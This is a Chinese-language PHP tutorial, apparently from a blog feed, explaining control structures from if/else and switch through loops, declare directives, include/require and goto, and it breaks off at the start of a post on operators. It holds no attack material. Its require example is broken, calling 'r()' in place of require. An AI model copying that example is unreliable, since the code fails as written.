<p>如果条件达成，则执行<code>if</code>语句</p>
<p>如果条件不满足，则执行其他语句</p>
<p>PHP 中<code>if...else</code>语句的格式为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (表达式)&#123;</span><br><span class="line">        语句<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">        语句<span class="number">2</span>;</span><br><span class="line">    &#125;	    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果表达式的值为真，就执行<code>if</code>的语句1，否则，就执行<code>else</code>的语句2</p>
<h2 id="if…elseif…else-条件控制语句"><a href="#if…elseif…else-条件控制语句" class="headerlink" title="if…elseif…else 条件控制语句"></a>if…elseif…else 条件控制语句</h2><p>(PHP 4, PHP 5, PHP 7, PHP 8)</p>
<p><code>if...elseif...else</code>语句是一种条件控制语句，它延伸了<code>if</code>语句</p>
<p>如果条件达成，则执行<code>if</code>语句</p>
<p>如果条件不满足，则查看<code>elseif</code>的表达式，如果条件达成则执行该语句</p>
<p>否则跳过该语句，直到结束</p>
<p><code>elseif</code>语句可以有多个，只在第一个<code>elseif</code>的值为真的时候执行</p>
<p>PHP 中<code>if...elseif..else</code>语句的格式为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (表达式)&#123;</span><br><span class="line">        语句<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">elseif</span> (表达式)&#123;</span><br><span class="line">        语句<span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">elseif</span> (表达式)&#123;</span><br><span class="line">        语句<span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">        语句n;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>先看<code>if</code>，如果表达式为真，则执行语句1，否则向下执行</p>
<p>如果<code>elseif</code>的表达式为真，则执行该语句，并结束整个条件循环，否则判断下一个<code>elseif</code>语句</p>
<p>如果前面的表达式都为假，则执行最后的<code>else</code>语句</p>
<h2 id="switch-条件控制语句"><a href="#switch-条件控制语句" class="headerlink" title="switch 条件控制语句"></a>switch 条件控制语句</h2><p>(PHP 4, PHP 5, PHP 7, PHP 8)</p>
<p><code>switch</code> 是条件控制语句，类似与<code>if</code>语句，但是表现形式不同</p>
<p><code>switch</code>是把同一个变量或者表达式，与很多不同的值比较，并根据它等于哪个值来执行不同的代码</p>
<p><code>switch</code>   语句一行接一行地执行（实际上是语句接语句）。开始时没有代码被执行。仅当一个   <code>case</code> 语句中的值和 <code>switch</code>   表达式的值匹配时 PHP 才开始执行语句，直到 <code>switch</code>   的程序段结束或者遇到第一个 <code>break</code>   语句为止。如果不在 <code>case</code> 的语句段最后写上 <code>break</code>   的话，PHP 将继续执行下一个 <code>case</code> 中的语句段</p>
<p>PHP 中<code>switch</code>语句的格式为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">switch</span>(变量/表达式)&#123;</span><br><span class="line">        <span class="keyword">case</span> 条件<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;语句1&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> 条件<span class="number">2</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;语句2&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> 条件<span class="number">3</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;语句3&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;语句n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>按照顺序，先看条件1，如果条件1与表达式相等，那么执行该<code>case</code>的语句，否则判断下一个<code>case</code>语句</p>
<p>如果<code>case</code>语句中没有和表达式相等的值，那么执行<code>default</code>的语句</p>
<p>在<code>switch</code>语句中，必须在每一个<code>case</code>语句内的结尾包含<code>break</code>语句，用来跳出整个流程语句</p>
<p>在PHP中，<code>case</code>语句不具备划分代码的作用，只起到标记代码的作用</p>
<p>如果不使用<code>break</code>语句退出，在具备条件的<code>case</code>语句内的代码执行之后，会按顺序执行之后的代码</p>
<h2 id="match-条件控制语句"><a href="#match-条件控制语句" class="headerlink" title="match 条件控制语句"></a>match 条件控制语句</h2><p>(PHP 8)</p>
<p><code>match</code> 表达式基于值的一致性进行分支计算。</p>
<p> <code>match</code>表达式和 <code>switch</code> 语句类似， 都有一个表达式主体，可以和多个可选项进行比较。</p>
<p> 与 <code>switch</code> 不同点是，它会像三元表达式一样求值。 </p>
<p>与 <code>switch</code> 另一个不同点，它的比较是严格比较（ <code>===</code>）而不是松散比较（<code>==</code>）</p>
<p><code>match</code>是PHP 8.0.0版本之后出现的语句</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$return_value</span> = <span class="keyword">match</span>(变量/表达式)&#123;</span><br><span class="line">    	条件语句 =&gt; 返回值,</span><br><span class="line">        条件语句<span class="number">1</span>,条件语句<span class="number">2</span>... =&gt; 返回值,</span><br><span class="line">    	<span class="keyword">default</span> =&gt; 返回值,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果条件语句和表达式相等，就会返回后面的值</p>
<p><code>match</code>表达式必须使用分号<code>;</code>结尾</p>
<p><code>match</code>表达式会返回一个值</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$i</span> = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">	<span class="variable">$return_value</span> = <span class="keyword">match</span>(<span class="variable">$i</span>)&#123;</span><br><span class="line">        <span class="string">&#x27;a&#x27;</span> =&gt; <span class="string">&#x27;this is a&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;b&#x27;</span> =&gt; <span class="string">&#x27;this is b&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;c&#x27;</span> =&gt; <span class="string">&#x27;this is c&#x27;</span>,</span><br><span class="line">        <span class="keyword">default</span> =&gt; <span class="string">&#x27;error&#x27;</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    var_dump(<span class="variable">$return_value</span>);</span><br><span class="line">    <span class="comment"># this is a</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="for-循环语句"><a href="#for-循环语句" class="headerlink" title="for 循环语句"></a>for 循环语句</h2><p>(PHP 4, PHP 5, PHP 7, PHP 8)</p>
<p>PHP 中<code>for</code>语句的格式为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">for</span>(初始化表达式;条件表达式;迭代表达式)&#123;</span><br><span class="line">        语句;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>初始化表达式在循环开始前，无条件求值（并执行）一次</p>
<p>条件表达式在每次循环之前执行，如果结果为真，则执行嵌套的语句，如果结果为假，则终止循环</p>
<p>迭代表达式在每次循环之后执行</p>
<p>每个表达式都可以为空，或者包括逗号分隔的多个表达式</p>
<p>在条件表达式中，所有逗号分隔的表达式都会计算，但是只取最后一个结果</p>
<p>如果条件表达式为空，那么默认为<code>true</code>，会无限循环下去</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span> &lt;= <span class="number">10</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$i</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="while-循环语句"><a href="#while-循环语句" class="headerlink" title="while 循环语句"></a>while 循环语句</h2><p>(PHP 4, PHP 5, PHP 7, PHP 8)</p>
<p><code>while</code> 是循环语句，当条件为真时，会循环执行循环体之内的语句，直到条件为假</p>
<p>PHP 中<code>while</code>语句的格式为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">while</span> (表达式)&#123;</span><br><span class="line">        语句;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>对表达式进行判断，如果条件为真，那么执行循环体内的PHP语句</p>
<p>执行结束后，再返回表达式进行判断，直到表达式的值为假时才会结束循环，执行之后的语句</p>
<h2 id="do…while-循环语句"><a href="#do…while-循环语句" class="headerlink" title="do…while 循环语句"></a>do…while 循环语句</h2><p>(PHP 4, PHP 5, PHP 7, PHP 8)</p>
<p><code>do...while</code>是循环语句，是<code>while</code>语句的另一种形式</p>
<p>两者是区别在于，<code>do...while</code>是先执行代码，然后再对表达式进行判断</p>
<p>PHP 中<code>do...while</code>语句的格式为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">do</span>&#123;代码块&#125;<span class="keyword">while</span>(表达式);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>先执行<code>do</code>之后的语句，然后对表达式进行判断</p>
<p>如果表达式的值为真，那么再次循环语句</p>
<p>表达式的真值在每次循环结束后检查</p>
<h2 id="foreach-数组循环语句"><a href="#foreach-数组循环语句" class="headerlink" title="foreach 数组循环语句"></a>foreach 数组循环语句</h2><p>(PHP 4, PHP 5, PHP 7, PHP 8)</p>
<p>在PHP中，<code>foreach</code>语句是用于遍历数组，只能够用于数组和对象</p>
<p>在PHP中<code>foreach</code>语句的格式为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$array</span> <span class="keyword">as</span> <span class="variable">$value</span>)</span><br><span class="line">        语句;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">foreach</span>(<span class="variable">$array</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">        语句;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>foreach</code>语句将遍历数组<code>$array</code>，每次循环的时候，将当前数组中的值赋值给<code>$value</code>或者<code>key</code>和<code>value</code></p>
<p>同时，数组指针向后移动知道遍历结束</p>
<p>当使用<code>foreach</code>语句时，数组指针将自动被重置，所以不需要手动设置指针位置</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$value</span>)&#123;</span><br><span class="line">        <span class="variable">$value</span> = <span class="variable">$value</span> *<span class="number">2</span>;</span><br><span class="line">        print_r(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="break-跳转语句"><a href="#break-跳转语句" class="headerlink" title="break 跳转语句"></a>break 跳转语句</h2><p>(PHP 4, PHP 5, PHP 7, PHP 8)</p>
<p>用来结束<code>for</code>，<code>foreach</code>，<code>while</code>，<code>do...while</code>，<code>switch</code>等语句的执行</p>
<p><code>break</code>可以选择数字退出多重循环</p>
<p>在PHP中<code>break</code>语句的格式为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">break</span> <span class="variable">$number</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>当执行程序，代码运行到<code>break</code>时，会至接退出该语句</p>
<p>可以接受一个可选的数字参数来决定跳出几重循环</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (++<span class="variable">$i</span>) &#123;</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$i</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;At 5&lt;br /&gt;\n&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span> <span class="number">1</span>;  <span class="comment">/* 只退出 switch. */</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;At 10; quitting&lt;br /&gt;\n&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span> <span class="number">2</span>;  <span class="comment">/* 退出 switch 和 while 循环 */</span></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="continue-跳转语句"><a href="#continue-跳转语句" class="headerlink" title="continue 跳转语句"></a>continue 跳转语句</h2><p>(PHP 4, PHP 5, PHP 7, PHP 8)</p>
<p><code>continue</code>在循环结构用来跳过本次循环中剩余的代码，并在条件为真时开启下一次循环</p>
<p>接受一个可选的数字参数来决定跳过几重循环到循环结尾。默认值是   <code>1</code>，即跳到当前循环末尾</p>
<p>在PHP中<code>continue</code>语句的格式为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">continue</span> <span class="variable">$number</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="declare-语句"><a href="#declare-语句" class="headerlink" title="declare 语句"></a>declare 语句</h2><p>(PHP 4, PHP 5, PHP 7, PHP 8)</p>
<p><code>declare</code>结果用来设定一段代码的执行指令</p>
<p>在PHP中<code>declare</code>语句的格式为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">declare</span>(directive);</span><br><span class="line">	statement</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>directive</code>部分允许设定<code>declare</code>代码段的行为</p>
<p>目前支持的指令有：<code>ticks</code>，<code>encoding</code>，<code>strict_types</code></p>
<p>指令是在文件编译时处理，所以指令只接受值，无法使用变量和常量</p>
<p><code>declare</code>结构也可以用于全局范围，影响到其后所有的代码</p>
<p>但是如果含有<code>declare</code>结构的文件被其他文件包含，则对包含它的父文件不起作用</p>
<h3 id="ticks-指令"><a href="#ticks-指令" class="headerlink" title="ticks 指令"></a>ticks 指令</h3><p><code>tick</code>（时钟周期）是一个在<code>declare</code>代码段中，解释器每执行N条可计时的低级语句就会发生的事件</p>
<p>N的值是<code>declare</code>中的<code>directive</code>部分用<code>ticks=N</code>来指定的</p>
<p>不是所有语句都可被计时，通常条件表达式和参数表达式都不可计时</p>
<p>在每个<code>tick</code>中出现的事件是由<code>register_tick_function()</code>来指定的</p>
<p>每个<code>tick</code>中可以出现多个事件</p>
<p>语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	declare(ticks=N);</span><br><span class="line">	代码块</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>以分号为结尾的普通语句可以触发<code>tick</code></p>
<p>复合语句，也就是各种流程控制语句也可以触发<code>tick</code></p>
<p>流程语句中的表达式也可以触发<code>tick</code></p>
<p>语句块，花括号括出来的语句也可以触发<code>tick</code></p>
<p>如以下例子，总共触发了十四次<code>tick</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">declare</span> (ticks = <span class="number">1</span>); <span class="comment">//这句这么写表示全局的脚本都做处理</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123; <span class="comment">//注册的函数</span></span><br><span class="line">        <span class="built_in">static</span> <span class="variable">$no</span>;</span><br><span class="line">        <span class="variable">$no</span>++;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$no</span>.<span class="string">&quot;======&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> microtime().<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    register_tick_function(<span class="string">&quot;foo&quot;</span>); <span class="comment">//注册函数，后面可以跟第2个参数，表示函数的参数</span></span><br><span class="line">	<span class="comment">// 此时函数执行，开始触发tick，包括函数本身和执行的函数，一共是两次</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="number">1</span>; <span class="comment">// 这里触发一次</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">5</span>;<span class="variable">$i</span>++) &#123; <span class="comment">//这里的循环也是语句，会做一次判断$i&lt;5的判断执行</span></span><br><span class="line">        <span class="comment">// 表达式会触发一次，这里该表达式执行了五次</span></span><br><span class="line">        <span class="variable">$b</span> = <span class="number">1</span>; <span class="comment">//触发tick，该语句随着循环触发了五次</span></span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">// 循环结束，触发一次</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="encoding-指令"><a href="#encoding-指令" class="headerlink" title="encoding 指令"></a>encoding 指令</h3><p>可以使用<code>encoding</code>指令来对每段脚本指定其编码方式</p>
<p><code>encoding</code>指令的格式为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">declare</span>(encoding=<span class="string">&#x27;UTF-8&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="strict-types-指令"><a href="#strict-types-指令" class="headerlink" title="strict_types 指令"></a>strict_types 指令</h3><p>通常情况下，PHP会强制将不合适的数据类型转换为合适的数据类型</p>
<p>比如，参数需要为<code>string</code>，传入的是<code>int</code>，就会强制转换为<code>string</code>类型</p>
<p>而<code>strict_types</code>指令则可以开启严格模式，在严格模式下，只能接受完全匹配的类型，否则会抛出异常</p>
<p>通过内部函数调用函数时，不会受 <code>strict_types</code> 声明影响</p>
<p><code>strict_types</code>指令的格式为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">declare</span>(strict_types=<span class="number">1</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>指令只影响指定使用的文件</p>
<p>必须是文件的第一句</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">declare</span>(strict_types=<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sum</span>(<span class="params"><span class="keyword">int</span> <span class="variable">$a</span>, <span class="keyword">int</span> <span class="variable">$b</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$a</span> + <span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var_dump(sum(<span class="number">1</span>, <span class="number">2</span>));</span><br><span class="line"><span class="comment">// 正常输出</span></span><br><span class="line">var_dump(sum(<span class="number">1.5</span>, <span class="number">2.5</span>));</span><br><span class="line"><span class="comment">// 会抛出异常</span></span><br><span class="line"><span class="comment">// 没有指令的话会强制执行转换为整形，最后结果是3</span></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>



<h2 id="return-返回语句"><a href="#return-返回语句" class="headerlink" title="return 返回语句"></a>return 返回语句</h2><p>(PHP 4, PHP 5, PHP 7, PHP 8)</p>
<p><code>return</code>语句可以将函数的执行结果返回</p>
<p>如果在一个函数中调用<code>return</code>语句，将立即结束此函数的执行并将它的参数作为函数的值返回</p>
<p>如果在全局范围内使用，则当前脚本文件中止运行</p>
<p><code>return</code>是语言结构，不是函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    var_dump(test(<span class="string">&#x27;10&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="include-包含语句"><a href="#include-包含语句" class="headerlink" title="include 包含语句"></a>include 包含语句</h2><p>(PHP 4, PHP 5, PHP 7, PHP 8)</p>
<p><code>include</code>是文件包含语句，可以引用外部代码文件</p>
<p>只有代码执行到<code>include</code>时，才会将外部文件包含进来</p>
<p>在PHP中<code>include</code>语句的语法为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">include</span>(<span class="string">&#x27;filename&#x27;</span>);</span><br><span class="line">	<span class="keyword">include</span> <span class="string">&#x27;filename&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>其中<code>filename</code>是需要包含的文件路径，可以是相对路径和绝对路径</p>
<p><code>filename</code>是一个字符串，所以需要引号闭合</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">test.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$a</span> = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span>.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">include</span>(<span class="string">&#x27;./test.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果被包含的文件使用<code>return</code>则会返回结果</p>
<p>如果被包含的文件使用<code>exit</code>则会退出执行，不再继续执行语句</p>
<h2 id="require-包含语句"><a href="#require-包含语句" class="headerlink" title="require 包含语句"></a>require 包含语句</h2><p>(PHP 4, PHP 5, PHP 7, PHP 8)</p>
<p><code>require</code>是文件包含语句，可以引用外部代码文件</p>
<p>在PHP文件执行之前，解释器会用被引用文件的全部内容替换<code>require</code>语句，然后与<code>require</code>语句之外的其他语句组成新的PHP文件，最后再按新的PHP文件执行程序代码</p>
<p><code>require</code>语句一般放在源文件的起始位置，需要引用公共资源等</p>
<p><code>require</code>语句和<code>include</code>语句几乎完全一样，不同的是当被包含文件不存在或者存在错误时</p>
<p><code>require</code>语句会返回错误并终止程序执行，而<code>include</code>则会返回一个警告但是程序会继续向下执行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">test.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$a</span> = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span>.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	r(<span class="string">&#x27;./test.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="include-once-包含语句"><a href="#include-once-包含语句" class="headerlink" title="include_once 包含语句"></a>include_once 包含语句</h2><p>(PHP 4, PHP 5, PHP 7, PHP 8)</p>
<p><code>include_once</code> 语句和 include 语句类似，唯一的区别就是如果包含的文件已经被包含过，就不会再次包含。<code>include_once</code> 可以确保在脚本执行期间同一个文件只被包含一次，以避免函数重定义、变量重新赋值等问题。</p>
<h2 id="require-once-包含语句"><a href="#require-once-包含语句" class="headerlink" title="require_once 包含语句"></a>require_once 包含语句</h2><p>(PHP 4, PHP 5, PHP 7, PHP 8)</p>
<p><code>require_once</code> 语句是 require 语句的延伸，它的功能与 require 语句基本类似，不同的是，在应用 <code>require_once</code> 语句时会先检查要包含的文件是不是已经在该程序中的其他地方被包含过，如果有，则不会再次重复包含该文件。且 <code>include_once</code> 会返回 <strong><code>true</code></strong></p>
<h2 id="goto-跳转语句"><a href="#goto-跳转语句" class="headerlink" title="goto 跳转语句"></a>goto 跳转语句</h2><p>(PHP 5 &gt;= 5.3.0, PHP 7, PHP 8)</p>
<p><code>goto</code> 操作符可以用来跳转到程序中的另一位置。该目标位置可以用区分大小写的目标名称加上冒号来标记（例如 name: ），而跳转指令是 <code>goto</code> 之后接上目标位置的标记。</p>
<p>PHP 中的 <code>goto</code>   有一定限制，目标位置只能位于同一个文件和作用域，也就是说无法跳出一个函数或类方法，也无法跳入到另一个函数。也无法跳入到任何循环或者   switch 结构中。可以跳出循环或者 switch，通常的用法是用 <code>goto</code>   代替多层的 <code>break</code>。 </p>
<p>PHP 中并不鼓励滥用 <code>goto</code>，滥用 <code>goto</code> 会导致程序的可读性严重下降。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="number">100</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;$i = &#x27;</span>.<span class="variable">$i</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$i</span> == <span class="number">3</span>)&#123;</span><br><span class="line">            <span class="keyword">goto</span> end;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    end:</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;跳出到 end 目标位置！&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="variable">$i</span> = <span class="number">0</span></span><br><span class="line"><span class="variable">$i</span> = <span class="number">1</span></span><br><span class="line"><span class="variable">$i</span> = <span class="number">2</span></span><br><span class="line"><span class="variable">$i</span> = <span class="number">3</span></span><br><span class="line">跳出到 end 目标位置！</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>编程语言</category>
        <category>PHP</category>
        <category>PHP基础</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP-运算符</title>
    <url>//d95e6fd1088d.html</url>
    <content><![CDATA[<h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><p>运算符是一种告诉编译器执行特定的数学或逻辑操作的符号</p>
<p>运算符是可以通过给出的一个或者多个值（表达式）来产生另一个值（因整个结构成为一个表达式）</p>
<h2 id="运算符的分类"><a href="#运算符的分类" class="headerlink" title="运算符的分类"></a>运算符的分类</h2><h3 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h3><table>
<thead>
<tr>
<th align="center">运算符</th>
<th align="center">描述</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">+$a</td>
<td align="center">标识运算符</td>
<td align="center">将a 转化为 int 或 float</td>
</tr>
<tr>
<td align="center">-$a</td>
<td align="center">取反运算符</td>
<td align="center">a 的负值</td>
</tr>
<tr>
<td align="center">+</td>
<td align="center">加法运算符</td>
<td align="center">10 + 20 = 30</td>
</tr>
<tr>
<td align="center">-</td>
<td align="center">减法运算符</td>
<td align="center">20 - 10 = 10</td>
</tr>
<tr>
<td align="center">*</td>
<td align="center">乘法运算符</td>
<td align="center">2 * 3 = 6</td>
</tr>
<tr>
<td align="center">/</td>
<td align="center">除法运算符</td>
<td align="center">10 / 3 = 3.3333333333333</td>
</tr>
<tr>
<td align="center">%</td>
<td align="center">取模，求两个数相除的余数</td>
<td align="center">10 % 6 = 4</td>
</tr>
<tr>
<td align="center">**</td>
<td align="center">幂运算符，求一个值的几次幂</td>
<td align="center">2 ** 3 = 8</td>
</tr>
<tr>
<td align="center">intdiv()</td>
<td align="center">整除（地板除）</td>
<td align="center">intdiv(10,4) = 2</td>
</tr>
</tbody></table>
<h3 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h3><p>基本的赋值运算符是 “ = “。它实际上的含义是把右边的表达式赋值给左边的变量</p>
<table>
<thead>
<tr>
<th align="center">运算符</th>
<th align="center">描述</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">=</td>
<td align="center">把右边的值赋值给左边</td>
<td align="center"><code>$a = 5</code> 等同于 <code>$a =5</code></td>
</tr>
<tr>
<td align="center">+=</td>
<td align="center">加法赋值运算符</td>
